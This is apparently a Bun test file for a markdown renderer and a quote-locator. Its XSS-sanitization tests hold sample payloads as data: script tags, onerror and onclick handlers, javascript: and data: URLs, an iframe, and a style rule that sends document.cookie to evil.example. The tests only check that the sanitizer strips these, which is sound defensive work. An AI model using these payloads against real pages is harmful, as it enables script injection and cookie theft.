import { describe, expect, test } from "bun:test";
import { renderMarkdown, renderMessageMarkdown, locateQuote } from "./render";

describe("renderMarkdown", () => {
  test("renders headings", () => {
    expect(renderMarkdown("# Hello\n")).toContain("<h1>Hello</h1>");
  });

  test("renders bold and italic", () => {
    const html = renderMarkdown("**bold** and *italic*");
    expect(html).toContain("<strong>bold</strong>");
    expect(html).toContain("<em>italic</em>");
  });

  test("renders unordered lists", () => {
    const html = renderMarkdown("- one\n- two\n- three\n");
    expect(html).toContain("<ul>");
    expect(html).toContain("<li>one</li>");
    expect(html).toContain("<li>three</li>");
  });

  test("renders fenced code blocks", () => {
    const html = renderMarkdown("```\nfoo\n```\n");
    expect(html).toContain("<code>");
    expect(html).toContain("foo");
  });

  test("renders GFM tables (gfm: true is set)", () => {
    const html = renderMarkdown("| a | b |\n|---|---|\n| 1 | 2 |\n");
    expect(html).toContain("<table>");
    expect(html).toContain("<th>a</th>");
    expect(html).toContain("<td>1</td>");
  });

  test("preserves the language-X class and data-language attr for fenced code", () => {
    const html = renderMarkdown("```js\nconst a = 1;\n```\n");
    expect(html).toContain(
      '<pre data-language="js"><code class="language-js">',
    );
  });
});

describe("renderMarkdown — XSS sanitization", () => {
  // marked v9 passes raw HTML in markdown straight through. Without a post-
  // render sanitizer, anything in this block would execute when the rendered
  // page is loaded. Each test confirms one common vector is neutralized.

  test("strips raw <script> tags", () => {
    const html = renderMarkdown("hello\n\n<script>window.x = 1</script>\n");
    expect(html).not.toContain("<script");
    expect(html).not.toContain("window.x");
  });

  test("strips event-handler attributes on inline elements (e.g. <img onerror>)", () => {
    const html = renderMarkdown(
      '![alt](https://example.com/x.png)\n\n<img src="x" onerror="alert(1)">\n',
    );
    // The ![] form yields a clean <img> with allowed attrs.
    expect(html).toContain("<img");
    // Neither the inline nor the markdown-derived img should retain onerror.
    expect(html).not.toContain("onerror");
    expect(html).not.toContain("alert(1)");
  });

  test("strips javascript: URLs from markdown links", () => {
    const html = renderMarkdown("[click](javascript:alert(1))\n");
    expect(html).not.toContain("javascript:");
    expect(html).not.toContain("alert(1)");
  });

  test("strips data: URLs from markdown links (only http/https/mailto allowed)", () => {
    const html = renderMarkdown(
      "[click](data:text/html,<script>alert(1)</script>)\n",
    );
    expect(html).not.toContain("data:");
    expect(html).not.toContain("<script");
  });

  test("strips <iframe> tags", () => {
    const html = renderMarkdown(
      'hello\n\n<iframe src="https://evil.example"></iframe>\n',
    );
    expect(html).not.toContain("<iframe");
    expect(html).not.toContain("evil.example");
  });

  test("strips <style> tags (CSS-based exfiltration vector)", () => {
    const html = renderMarkdown(
      "hello\n\n<style>body { background: url('https://evil.example/'+document.cookie) }</style>\n",
    );
    expect(html).not.toContain("<style");
    expect(html).not.toContain("evil.example");
  });

  test("escapes raw HTML inside fenced code blocks (marked already does this; regression guard)", () => {
    const html = renderMarkdown("```\n<script>alert(1)</script>\n```\n");
    // Raw < and > inside a code block must be entity-encoded so the browser
    // shows them as text, not as executable markup.
    expect(html).toContain("&lt;script&gt;");
    expect(html).not.toMatch(/<script[^&]/);
  });

  test("strips inline event handlers on otherwise-allowed tags", () => {
    const html = renderMarkdown(
      '<a href="https://example.com" onclick="alert(1)">link</a>\n',
    );
    expect(html).toContain('href="https://example.com"');
    expect(html).not.toContain("onclick");
    expect(html).not.toContain("alert(1)");
  });

  test("strips arbitrary classes (only language-X on <code> is allowed)", () => {
    const html = renderMarkdown('<p class="evil-class">hello</p>\n');
    expect(html).toContain("hello");
    expect(html).not.toContain("evil-class");
  });
});

describe("renderMessageMarkdown", () => {
  test("renders agent-style numbered list with bold labels", () => {
    const msg = [
      "Here are two directions:",
      "",
      "1. **Structure-forward:** keeps the original frame",
      "2. **Season-forward:** leans on year-round wear",
    ].join("\n");
    const html = renderMessageMarkdown(msg);
    expect(html).toContain("<ol>");
    expect(html).toContain("<strong>Structure-forward:</strong>");
    expect(html).toContain("<strong>Season-forward:</strong>");
  });

  test("renders inline code and fenced code blocks", () => {
    const html = renderMessageMarkdown("Use `foo` like:\n\n```\nfoo()\n```");
    expect(html).toContain("<code>foo</code>");
    expect(html).toMatch(/<pre><code[^>]*>foo\(\)/);
  });

  test("preserves http/https links", () => {
    const html = renderMessageMarkdown("see [docs](https://example.com)");
    expect(html).toContain('href="https://example.com"');
  });

  test("strips javascript: URLs from inline links", () => {
    const html = renderMessageMarkdown("click [here](javascript:alert(1))");
    expect(html).not.toContain("javascript:");
  });

  test("strips raw <script> tags inside agent prose", () => {
    const html = renderMessageMarkdown("ok <script>alert(1)</script> done");
    expect(html).not.toContain("<script>");
    expect(html).toContain("ok");
    expect(html).toContain("done");
  });

  test("plain prose still produces a paragraph wrapper", () => {
    const html = renderMessageMarkdown("Fair point.");
    expect(html).toContain("<p>Fair point.</p>");
  });
});

describe("locateQuote", () => {
  test("finds the quote when it appears once", () => {
    expect(locateQuote("the quick brown fox", "quick", "")).toBe(4);
  });

  test("returns -1 when the quote is absent", () => {
    expect(locateQuote("the quick brown fox", "wolf", "")).toBe(-1);
  });

  test("uses context_before to disambiguate between duplicate occurrences", () => {
    const flat = "the cat sat. then the cat slept.";
    // First "cat" is at index 4, second is at index 22.
    // With "then the " as context, we should match the second.
    expect(locateQuote(flat, "cat", "then the ")).toBe(22);
    // With "the " as context, both match — indexOf returns the first.
    expect(locateQuote(flat, "cat", "the ")).toBe(4);
  });

  test("falls back to first occurrence when context-prefixed search fails", () => {
    const flat = "the cat sat. then the cat slept.";
    // Context that doesn't appear before the quote — fall back to first occurrence.
    expect(locateQuote(flat, "cat", "stale context that doesnt match: ")).toBe(
      4,
    );
  });

  test("treats empty contextBefore as 'no context provided'", () => {
    expect(locateQuote("the cat sat", "cat", "")).toBe(4);
  });

  test("returns -1 for an empty quote", () => {
    expect(locateQuote("anything", "", "context")).toBe(-1);
  });

  test("handles quote at position 0", () => {
    expect(locateQuote("cat sat", "cat", "")).toBe(0);
  });

  test("context_before that ends right at the quote works correctly", () => {
    const flat = "A small trowel (ceremonial)";
    const ctx = "A small ";
    expect(locateQuote(flat, "trowel", ctx)).toBe(8);
  });
});
